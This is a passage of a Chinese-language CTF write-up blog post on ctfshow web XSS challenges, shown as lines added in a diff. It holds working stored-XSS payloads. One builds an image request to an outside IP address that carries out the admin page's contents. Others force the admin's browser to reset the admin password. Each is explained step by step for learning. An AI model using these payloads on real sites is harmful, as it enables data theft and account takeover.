+<p>img.src &#x3D; “<a target="_blank" rel="noopener" href="http://120.46.41.173:9023/">http://120.46.41.173:9023/</a>“ +  document.querySelector(‘#top &gt; div.layui-container &gt;  div:nth-child(4) &gt; div &gt; div.layui-table-box &gt;  div.layui-table-body.layui-table-main’).textContent;</p>
+<p>这个设置了src属性，通过多个部分拼接，首先是地址 + document.querySelector()DOM查询操作 + textContent是获取DOM元素文本的内容的属性</p>
+</blockquote>
+<blockquote>
+<p>document.body.append(img) 这段代码将创建的图像元素img添加到页面的body元素内，这样图像就会被加载并显示在页面上.</p>
+</blockquote>
+<h2 id="web330-payload："><a href="#web330-payload：" class="headerlink" title="web330 payload："></a>web330 payload：</h2><p><code>&lt;script&gt;window.location.href=&#39;http://127.0.0.1/api/change.php?p=1717&#39;;&lt;/script&gt;</code></p>
+<p>思路：这个题可以修改密码，让admin管理员自己修改密码.</p>
+<p>自己先注册号，在修改密码页面抓包，看是什么情况</p>
+<p><img src="/CTF/Web/XSS%E6%BC%8F%E6%B4%9E/330.01.png"></p>
+<p>很明显，有了路径，且变量p就是我们修改密码的变量</p>
+<p>直接创建账号密码 都为 payload，让admin在点击我们的payload的时候，会自动修改密码为1717</p>
+<p>这个时候我们直接以admin账号 密码为1717登录即可，</p>
+<p>-&gt; 然后点击用户管理（这个时候也相当于点击我们的payload的，会发生页面跳转）</p>
+<p>-&gt; 我们可以点击用户管理的同时打开源码或者抓包。</p>
+<h2 id="web-331-payload："><a href="#web-331-payload：" class="headerlink" title="web 331 payload："></a>web 331 payload：</h2><p>这个题变成了post方法，改一改payload即可，其他与上一题一样：</p>
+<p><code>&lt;script&gt;$.ajax(&#123;url:&quot;api/change.php&quot;,method:&quot;POST&quot;,data:&#123;&#39;p&#39;:&#39;1717&#39;&#125;&#125;)&lt;/script&gt;</code></p>
+<p>-&gt; 这段代码是用<code>jQuery</code>库中的 <code>$.ajax()</code> 函数发起的一个异步http请求。</p>
+<p>-&gt; <code>$.ajax(&#123;&#125;)</code> 这是<code>jQuery</code>库提供的用于异步http请求的方法。它接受一个包含配置选项的对象作为参数</p>
+<p>-&gt;<code>url:&quot;api/change.php&quot;</code> 这是请求的目标URL，请求被发送到目标URL，向服务器发送一个HTTP请求</p>
+<p>-&gt;<code>mthod:&quot;POST&quot;</code> 这是表明 此次HTTP请求的方法是POST方法</p>
+<p>-&gt; <code>data:&#123;&#39;p&#39;:&#39;1717&#39;&#125;</code> 这是参数及值</p>
+<hr>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Jayjay___/article/details/133375048">参考ctfshow web入门 xss payload</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Web/" rel="tag"># Web</a>
+              <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" rel="tag"># 漏洞学习</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/" rel="prev" title="BUU平台的Web题记录">
+                  <i class="fa fa-angle-left"></i> BUU平台的Web题记录
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/" rel="next" title="BUU平台的Pwn题记录">
+                  BUU平台的Pwn题记录 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    
+  <div class="comments" id="disqus_thread">
+    <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+  </div>
+  
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Li1x</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="Word count total">66k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">2:01</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+<script class="next-config" data-name="disqus" type="application/json">{"enable":true,"shortname":"li1x","count":true,"i18n":{"disqus":"disqus"}}</script>
+<script src="/js/third-party/comments/disqus.js"></script>
+
+</body>
+</html>
